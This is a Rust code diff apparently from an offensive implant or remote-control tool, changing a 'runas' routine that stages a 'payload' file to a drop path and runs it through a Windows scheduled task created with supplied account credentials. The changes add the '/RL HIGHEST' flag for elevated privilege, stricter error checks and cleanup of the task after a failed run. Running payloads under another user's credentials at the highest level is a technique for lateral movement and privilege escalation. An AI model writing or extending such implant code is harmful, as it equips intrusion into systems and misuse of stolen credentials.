@@ -320,9 +320,12 @@ mod inner {
                 fs::write(&drop_path, data)
                     .map_err(|e| format!("write payload failed: {}", e))?;
             } else if drop_path.to_lowercase() != cmd_path.to_lowercase() {
-                let _ = fs::copy(cmd_path, &drop_path);
+                fs::copy(cmd_path, &drop_path)
+                    .map_err(|e| format!("copy payload failed: {}", e))?;
             }
-            if std::path::Path::new(&drop_path).exists() { &drop_path } else { cmd_path }
+            if std::path::Path::new(&drop_path).exists() { &drop_path } else {
+                return Err("runas: staged payload is not readable".to_string());
+            }
         };
 
         // Strip leading ".\" from user for schtasks /RU (schtasks rejects "." as domain).
@@ -344,7 +347,7 @@ mod inner {
                 "/RU", &ru_account, "/RP", pass,
                 "/TR", effective_path,
                 "/TN", &task_name,
-                "/SC", "ONCE", "/ST", "00:00",
+                "/SC", "ONCE", "/ST", "00:00", "/RL", "HIGHEST",
                 "/F",
             ])
             .output()
@@ -358,9 +361,20 @@ mod inner {
             ));
         }
 
-        let _ = Command::new("schtasks")
+        let run_out = Command::new("schtasks")
             .args(["/run", "/TN", &task_name])
-            .output();
+            .output()
+            .map_err(|e| format!("runas: schtasks /run: {}", e))?;
+        if !run_out.status.success() {
+            let _ = Command::new("schtasks")
+                .args(["/delete", "/TN", &task_name, "/F"])
+                .output();
+            return Err(format!(
+                "runas: schtasks /run failed: {}{}",
+                String::from_utf8_lossy(&run_out.stdout),
+                String::from_utf8_lossy(&run_out.stderr),
+            ));
+        }
 
         let tn = task_name.clone();
         std::thread::spawn(move || {
